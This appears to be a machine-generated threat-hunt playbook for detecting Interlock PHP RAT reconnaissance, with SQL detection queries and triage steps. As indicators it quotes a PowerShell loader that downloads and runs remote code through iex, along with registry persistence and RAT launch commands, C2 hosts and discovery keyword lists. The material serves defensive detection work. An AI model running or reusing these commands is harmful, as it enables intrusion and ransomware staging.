---
analysis: A simple detection rule might fire on 'systeminfo', but this hunt correlates
  unusual PHP execution paths with rare script patterns (stack-counted) and specific
  JSON profiling output, distinguishing an active adversary from noisy administrative
  scripts.
blind_spots:
- id: script-logging-blindspot
  owner: Endpoint Engineering
  question: What specific discovery commands were executed inside the PowerShell session?
  remediation: Enable PowerShell Script Block Logging via GPO for all domain systems.
  requires: hb_script_activity (PowerShell Event ID 4104)
  risk: Without script block logging, we can only see the outer PHP/PowerShell process,
    making it difficult to distinguish between legitimate admin work and RAT profiling.
  stage: automated-reconnaissance
- id: obfuscated-script-content
  owner: Detection Engineering
  question: Did the attacker use obfuscation to hide keywords like 'adsisearcher'?
  remediation: Implement alerts for highly entropic or base64-encoded script blocks
    in PowerShell.
  requires: Advanced script de-obfuscation in hb_script_activity
  risk: Keyword-based hunting will miss heavily obfuscated scripts or base64-encoded
    command lines.
  stage: hands-on-domain-discovery
coverage:
- stage: automated-reconnaissance
  status: covered
  steps:
  - php-in-appdata
  - automated-json-profiling
- stage: hands-on-domain-discovery
  status: covered
  steps:
  - manual-domain-backup-discovery
- reason: 'Handled in Hunt 1: Interlock Social Engineering and Initial Payloads.'
  stage: initial-access-social-engineering
  status: out_of_scope
- reason: 'Handled in Hunt 1: Interlock Social Engineering and Initial Payloads.'
  stage: powershell-loader-execution
  status: out_of_scope
- reason: 'Handled in Hunt 1: Interlock Social Engineering and Initial Payloads.'
  stage: interlock-php-rat-deployment
  status: out_of_scope
- reason: 'Handled in Hunt 3: Interlock C2 and Lateral Movement.'
  stage: c2-and-fallback-communications
  status: out_of_scope
- reason: 'Handled in Hunt 1: Interlock Social Engineering and Initial Payloads.'
  stage: registry-run-key-persistence
  status: out_of_scope
- reason: 'Handled in Hunt 3: Interlock C2 and Lateral Movement.'
  stage: lateral-movement-rdp
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Interlock RAT reconnaissance is the precursor to large-scale ransomware
    deployment. Detecting this phase protects the organization's backup integrity
    and prevents catastrophic data loss.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has established a beachhead using the Interlock PHP RAT and
  is conducting automated environment profiling and manual searches for backup infrastructure
  and domain controllers.
labels:
- hunt
- attack.t1016
- attack.t1082
- attack.t1057
- attack.t1007
- attack.t1033
- attack.t1083
- attack.t1018
- attack.t1087.002
- attack.t1482
name: Interlock RAT Discovery and Reconnaissance
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine for reconnaissance activity.
    from:
      kind: manual
      observed: '2025-07-15'
      ref: hunt-standard-lookback
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    gates:
    - design-checks
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Start with workstations and file servers where users may have interactive
  sessions. The discovery scripts are noisy, so focus on any account performing mass
  reconnaissance via PowerShell.
references:
- name: "The DFIR Report \u2014 KongTuke FileFix Leads to New Interlock RAT Variant"
  url: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
related:
- hunt: interlock-initial-delivery
  reason: Initial access and PHP RAT deployment are handled in the first hunt of this
    series.
  relation: precedes
- hunt: interlock-c2-and-exfiltration
  reason: Exfiltration via Cloudflare tunnels is handled in the third hunt of this
    series.
  relation: follows
scenario:
  stages:
  - name: Social Engineering Web-Inject
    observables:
    - Single-line script hidden in HTML
    - Fake captcha 'Verify you are human'
    - User instructed to open Run command and paste from clipboard
    slug: initial-access-social-engineering
    tactic: initial-access
    techniques:
    - T1189
    - T1204.001
  - name: PowerShell Loader Execution
    observables:
    - powershell.exe -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object
      System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\")
      | iex"
    - deadly-programming-attorneys-our.trycloudflare.com
    slug: powershell-loader-execution
    tactic: execution
    techniques:
    - T1059.001
    - T1105
    - T1562.001
  - name: Interlock PHP RAT Deployment
    observables:
    - C:\Users\REDACTED\AppData\Roaming\php\php.exe -d extension=zip -d extension_dir=ext
      C:\Users\\AppData\Roaming\php\wefs.cfg 1
    - AppData\Roaming\php\php.exe
    - AppData\Roaming\php\wefs.cfg
    slug: interlock-php-rat-deployment
    tactic: execution
    techniques:
    - T1059
  - name: Automated System Profiling
    observables:
    - Get-NetNeighbor -AddressFamily IPv4
    - systeminfo /FO CSV
    - tasklist /svc /FO CSV
    - Get-Service
    - Get-PSDrive -PSProvider FileSystem
    - '[Security.Principal.WindowsIdentity]::GetCurrent()'
    slug: automated-reconnaissance
    tactic: discovery
    techniques:
    - T1016
    - T1082
    - T1057
    - T1007
    - T1033
    - T1083
  - name: Interactive Domain & Backup Discovery
    observables:
    - '[adsiSearcher]"(ObjectClass=computer)"'
    - 'nltest /dclist:'
    - net user %USERNAME% /domain
    - Regex matching VB|VBR|VEEA|VEEAM|BCK|BACK to find backup servers
    - whoami
    slug: hands-on-domain-discovery
    tactic: discovery
    techniques:
    - T1018
    - T1087.002
    - T1482
  - name: Cloudflare Tunnel C2
    observables:
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    - galleries-physicians-psp-wv.trycloudflare.com
    - 64.95.12.71
    - 184.95.51.165
    slug: c2-and-fallback-communications
    tactic: command-and-control
    techniques:
    - T1572
    - T1102.003
  - name: Registry Run Key Persistence
    observables:
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "REDACTED" /t
      REG_SZ /d ""C:\Users\REDACTED\AppData\Roaming\php\php.exe" "C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg""
      /f
    slug: registry-run-key-persistence
    tactic: persistence
    techniques:
    - T1547.001
  - name: Lateral Movement via RDP
    observables:
    - RDP connections to internal hosts
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  summary: The Interlock ransomware group has introduced a PHP-based Remote Access
    Trojan (RAT) variant, delivered via the KongTuke campaign using social engineering
    and malicious PowerShell scripts. The malware establishes a command-and-control
    channel through Cloudflare Tunnels and fallback IPs, performs extensive host and
    domain reconnaissance, and maintains persistence via registry run keys to facilitate
    lateral movement through RDP.
series:
  index: 2
  slug: kongtuke-filefix-leads-to-new-interlock-rat-variant
  title: KongTuke FileFix Leads to New Interlock RAT Variant
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Interlock RAT Discovery and Reconnaissance

This hunt focuses on the high-fidelity discovery phase of the Interlock RAT campaign. After deployment, the PHP-based RAT executes a series of PowerShell commands to profile the host (exporting JSON data) and performs manual 'hands-on-keyboard' discovery to find domain controllers and backup servers (Veeam, VBR, etc.). The hunt identifies the PHP interpreter running from user-writable AppData paths, correlates it with specific profiling script blocks, and stack-counts rare AD and backup enumeration activities to isolate compromised hosts before ransomware is deployed.

## php-in-appdata
<!-- PHP execution from user profiles -->
Identify hosts running PHP or renamed PHP binaries from user-writable paths, which is the primary execution vector for this RAT variant.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days)
~~~yaml
expected: Hosts where a PHP interpreter is active in a user's roaming profile. Silence
  means no such execution was found in the specified window.
reads:
- device_hostname
- process_path
- process_cmd_line
- user_name
- time
- process_name
- process_original_file_name
silence: evidence_of_absence
source: hb_process_activity
verified: none
~~~
SELECT device_hostname, process_path, process_cmd_line, user_name, time FROM hb_process_activity WHERE activity_id = 1 AND (LOWER(process_path) LIKE '%\appdata\roaming\%' OR LOWER(process_cmd_line) LIKE '%\appdata\roaming\%') AND (LOWER(process_name) LIKE '%php%' OR LOWER(process_original_file_name) = 'php.exe') AND time >= datetime('now', '-{{lookback_days}} days')
```

## recon-parallel
<!-- Corroborate reconnaissance patterns -->
parallel:
- → automated-json-profiling
- → manual-domain-backup-discovery
join: → triage-recon

## automated-json-profiling
<!-- Automated system profiling to JSON -->
Detect the specific pattern of running discovery commands and piping them to ConvertTo-Json, used by the RAT to exfiltrate host context.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: Script blocks performing environment mapping for exfiltration. High-fidelity
  indicator of RAT profiling.
reads:
- device_hostname
- script_content
- actor_user_name
- time
silence: evidence_of_absence
source: hb_script_activity
verified: none
~~~
SELECT device_hostname, script_content, actor_user_name, time FROM hb_script_activity WHERE activity_id = 1 AND LOWER(script_content) LIKE '%convertto-json%' AND (LOWER(script_content) LIKE '%get-netneighbor%' OR LOWER(script_content) LIKE '%systeminfo%' OR LOWER(script_content) LIKE '%tasklist /svc%' OR LOWER(script_content) LIKE '%get-psdrive%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## manual-domain-backup-discovery
<!-- Rare AD and backup infrastructure discovery -->
Find rare instances of manual AD enumeration and backup system identification through keyword matches and stack-counting.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Rare scripts targeting AD users or backup systems. Administrative tools
  used maliciously will stand out when stack-counted.
prevalence:
  by: device_hostname
  key:
  - script_content
  rare_below: 3
reads:
- script_content
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_script_activity
verified: none
~~~
SELECT script_content, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_script_activity WHERE activity_id = 1 AND (LOWER(script_content) LIKE '%adsisearcher%' OR LOWER(script_content) LIKE '%nltest /dclist%' OR LOWER(script_content) LIKE '%net user % /domain%' OR LOWER(script_content) LIKE '%veeam%' OR LOWER(script_content) LIKE '%vbr%' OR LOWER(script_content) LIKE '%bck%' OR LOWER(script_content) LIKE '%back%') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY script_content HAVING host_count <= 3
```

## triage-recon
<!-- Triage discovery patterns -->
```agent target=hunter
cite: required
context:
- php-in-appdata
- automated-json-profiling
- manual-domain-backup-discovery
max_iterations: 3
objective: Determine if any host shows evidence of a PHP-based RAT initiating discovery,
  specifically system profiling to JSON or manual backup infrastructure identification.
success_criteria: A verdict of malicious | suspicious | benign per host, citing the
  specific script blocks or process paths.
tools:
- endpoint
```

## route-on-verdict
<!-- Route on verdict -->
if~: "the triage verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-endpoint
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: script-logging-blindspot)
else: → close-out

## isolate-endpoint
<!-- Isolate host and collect artifacts -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the endpoint. Collect the PHP directory from AppData\Roaming and the wefs.cfg file for forensic analysis. Terminate all php.exe processes running from non-standard paths.
```
→ analyst-review

## analyst-review
<!-- Analyst forensic review -->
```manual target=analyst
Examine the script content from hb_script_activity. Check if sensitive backup details were exported. Search for follow-on lateral movement via RDP in hb_auth_signin.
```
→ end

## close-out
<!-- Close out -->
```manual target=analyst
Document the absence of Interlock discovery activity. If benign PHP activity was found, record the context for tuning.
```
→ end
